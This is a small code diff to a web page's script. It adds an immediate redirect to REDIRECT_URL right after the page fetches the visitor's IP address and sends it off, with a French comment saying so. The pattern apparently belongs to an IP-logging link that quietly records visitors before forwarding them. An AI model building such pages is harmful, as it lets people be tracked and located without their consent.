@@ -92,6 +92,7 @@
       const ip = await getIP();
       if (ip) {
         await sendIP(ip);
+        window.location.href = REDIRECT_URL; // Redirection immdiaate aprés envoi IP
       }
     };
   </script>
